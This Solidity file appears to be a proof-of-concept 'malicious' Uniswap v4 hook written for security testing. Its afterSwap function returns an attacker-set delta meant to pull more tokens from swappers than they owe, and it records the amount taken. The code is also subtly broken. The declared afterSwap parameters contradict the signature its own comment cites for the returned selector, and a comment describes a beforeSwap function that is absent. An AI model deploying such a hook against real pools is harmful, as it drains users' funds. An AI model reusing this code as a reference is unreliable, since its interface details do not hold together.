// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Malicious hook for Uniswap v4 PoC — returns arbitrary hookDelta
///         in afterSwap to test whether the hook can extract more than the
///         swapper's owed amount.
/// @dev This hook has AFTER_SWAP_FLAG (bit 6 = 0x40) and
///      AFTER_SWAP_RETURNS_DELTA_FLAG (bit 2 = 0x04) set in its address.
///      The address must end in 0x44 to have both bits set.
///      Deploy via CREATE2 with salt 0x44 to get address 0x...44.
contract MaliciousAfterSwapHook {
    // The malicious delta to return in afterSwap. Stored in storage so
    // the attacker can set it before each swap.
    int128 public maliciousDelta;

    // Track how much the hook has extracted (for measurement).
    uint256 public totalExtracted;

    event MaliciousDeltaSet(int128 delta);
    event AfterSwapCalled(int128 returnedDelta);

    function setMaliciousDelta(int128 delta) external {
        maliciousDelta = delta;
        emit MaliciousDeltaSet(delta);
    }

    /// @notice IHooks.afterSwap implementation. Returns
    ///         (IHooks.afterSwap.selector, int128(maliciousDelta)).
    /// @dev Selector: 0x3b08c148 (keccak256("afterSwap(address,(address,address,uint24,int24,address),(bool,uint128,int256,uint160),int256,bytes)")[:4])
    function afterSwap(
        address, /* sender */
        bytes calldata, /* hookData - unused */
        uint256, /* fee - unused */
        uint256, /* extracted from delta - unused */
        bytes calldata /* more data - unused */
    ) external returns (bytes4, int128) {
        totalExtracted += uint128(maliciousDelta > 0 ? uint128(maliciousDelta) : 0);
        emit AfterSwapCalled(maliciousDelta);
        return (bytes4(0x3b08c148), maliciousDelta);
    }

    /// @notice Required: must return the correct selector for beforeSwap
    ///         (if BEFORE_SWAP_FLAG is NOT set, this is never called).
    ///         We don't set BEFORE_SWAP_FLAG, so this is a no-op.
    ///         But we include a fallback that returns the right selector
    ///         in case it's called.

    /// @notice Fallback for any other IHooks call. Returns the correct
    ///         selector for afterSwap (since the hook address has
    ///         AFTER_SWAP_FLAG set).
    fallback() external {
        // For any call, return the afterSwap selector + 0 delta.
        // This is safe because PoolManager only calls hooks that have
        // the corresponding flag set.
        assembly ("memory-safe") {
            // Return: bytes4(0x3b08c148) + int128(0) = 64 bytes
            mstore(0, 0x3b08c14800000000000000000000000000000000000000000000000000000000)
            mstore(32, 0)
            return(0, 64)
        }
    }

    /// @notice Allow the hook to receive ETH (for testing).
    receive() external payable {}
}
